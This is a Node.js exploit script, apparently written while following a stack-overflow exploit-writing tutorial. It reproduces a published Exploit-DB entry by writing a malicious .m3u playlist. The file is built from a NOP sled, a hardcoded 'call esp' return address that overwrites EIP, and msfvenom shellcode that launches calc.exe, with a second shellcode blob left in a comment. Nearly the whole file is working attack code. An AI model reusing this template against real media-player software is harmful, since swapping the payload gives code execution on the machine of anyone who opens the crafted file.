// analysis for https://www.exploit-db.com/exploits/40018
// using this posts : https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/

const fs = require('fs')
const fileName = 'sample.m3u'
const blockSize = 1012
const addressSize = 4 // 4 bytes == 1 address

const toLittleEndian = addrs => {
  let actualValue = null
  
  if (typeof addrs === "string") {
    if (addrs.indexOf("0x") == 0) {
      actualValue = addrs.slice(2)
    } else {
      actualValue = addrs
    }
  } else if (typeof addrs === "number") {
    actualValue = addrs.toString(16)
  }

  if (actualValue !== null) {
    // return actualValue.match(/.{1,2}/g).reduce((res, val) => `\x${val+res}`, '')
  } else {
    console.error(`Provided address ${addrs} can't be converted to little endiand`)
  }
}

const breakpoint = () => '\xcc'.repeat(addressSize) // 0xcc = int3 = breakpoint
const nopsled = lenght => '\x90'.repeat(lenght) // 0xcc = nop
const payload = () => {
  // msfvenom -a x86 --platform windows -p windows/exec CMD='calc.exe' -b '\x00\x09\x0a\x0d\x1a\x20' --format python
  buf =  ""
  buf += "\xdd\xc3\xba\xad\xd7\xf1\x1e\xd9\x74\x24\xf4\x5f\x31"
  buf += "\xc9\xb1\x31\x31\x57\x18\x83\xef\xfc\x03\x57\xb9\x35"
  buf += "\x04\xe2\x29\x3b\xe7\x1b\xa9\x5c\x61\xfe\x98\x5c\x15"
  buf += "\x8a\x8a\x6c\x5d\xde\x26\x06\x33\xcb\xbd\x6a\x9c\xfc"
  buf += "\x76\xc0\xfa\x33\x87\x79\x3e\x55\x0b\x80\x13\xb5\x32"
  buf += "\x4b\x66\xb4\x73\xb6\x8b\xe4\x2c\xbc\x3e\x19\x59\x88"
  buf += "\x82\x92\x11\x1c\x83\x47\xe1\x1f\xa2\xd9\x7a\x46\x64"
  buf += "\xdb\xaf\xf2\x2d\xc3\xac\x3f\xe7\x78\x06\xcb\xf6\xa8"
  buf += "\x57\x34\x54\x95\x58\xc7\xa4\xd1\x5e\x38\xd3\x2b\x9d"
  buf += "\xc5\xe4\xef\xdc\x11\x60\xf4\x46\xd1\xd2\xd0\x77\x36"
  buf += "\x84\x93\x7b\xf3\xc2\xfc\x9f\x02\x06\x77\x9b\x8f\xa9"
  buf += "\x58\x2a\xcb\x8d\x7c\x77\x8f\xac\x25\xdd\x7e\xd0\x36"
  buf += "\xbe\xdf\x74\x3c\x52\x0b\x05\x1f\x38\xca\x9b\x25\x0e"
  buf += "\xcc\xa3\x25\x3e\xa5\x92\xae\xd1\xb2\x2a\x65\x96\x4d"
  buf += "\x61\x24\xbe\xc5\x2c\xbc\x83\x8b\xce\x6a\xc7\xb5\x4c"
  buf += "\x9f\xb7\x41\x4c\xea\xb2\x0e\xca\x06\xce\x1f\xbf\x28"
  buf += "\x7d\x1f\xea\x4a\xe0\xb3\x76\xa3\x87\x33\x1c\xbb"
  return buf
  
}
// '\xcc'.repeat(4)
//"\xba\xb7\x20\xa1\x05\xdb\xcd\xd9\x74\x24\xf4\x5e\x31\xc9\xb1\x30\x31\x56\x13\x03\x56\x13\x83\xc6\xb3\xc2\x54\xf9\x53\x80\x97\x02\xa3\xe5\x1e\xe7\x92\x25\x44\x63\x84\x95\x0e\x21\x28\x5d\x42\xd2\xbb\x13\x4b\xd5\x0c\x99\xad\xd8\x8d\xb2\x8e\x7b\x0d\xc9\xc2\x5b\x2c\x02\x17\x9d\x69\x7f\xda\xcf\x22\x0b\x49\xe0\x47\x41\x52\x8b\x1b\x47\xd2\x68\xeb\x66\xf3\x3e\x60\x31\xd3\xc1\xa5\x49\x5a\xda\xaa\x74\x14\x51\x18\x02\xa7\xb3\x51\xeb\x04\xfa\x5e\x1e\x54\x3a\x58\xc1\x23\x32\x9b\x7c\x34\x81\xe6\x5a\xb1\x12\x40\x28\x61\xff\x71\xfd\xf4\x74\x7d\x4a\x72\xd2\x61\x4d\x57\x68\x9d\xc6\x56\xbf\x14\x9c\x7c\x1b\x7d\x46\x1c\x3a\xdb\x29\x21\x5c\x84\x96\x87\x16\x28\xc2\xb5\x74\x26\x15\x4b\x03\x04\x15\x53\x0c\x38\x7e\x62\x87\xd7\xf9\x7b\x42\x9c\xf6\x31\xcf\xb4\x9e\x9f\x85\x85\xc2\x1f\x70\xc9\xfa\xa3\x71\xb1\xf8\xbc\xf3\xb4\x45\x7b\xef\xc4\xd6\xee\x0f\x7b\xd6\x3a\x6c\x1a\x44\xa6\x73"
//'\x90'.repeat(216)

let buf = ''
// buf += breakpoint() 
buf += nopsled(blockSize)
// buf += breakpoint()
buf += "\xeb\xc5\x82\x77" // overrides EIP with Address : 7782c5eb => call esp
// overrides EIP with Address : 7782d520 => call esp
// buf += breakpoint()
buf += payload()

fs.writeFile(`./${fileName}`, buf, 'binary', () => console.log(`Done! > ${fileName}`))

// const r2pipe = require('r2pipe')
// r2pipe.open("/bin/true",function (err, r2) {
  // if (err) {
    // console.error(err)
  // } else {
    // r2.syscmd(`ragg2 -P ${blockSize} -r`, function(err, o) {
      // if (err) {
        // console.error(err)
      // } else {
        // buf += o
        // r2.quit()
        // process.stdout.write(buf)
      // }
    // })
  // }
// })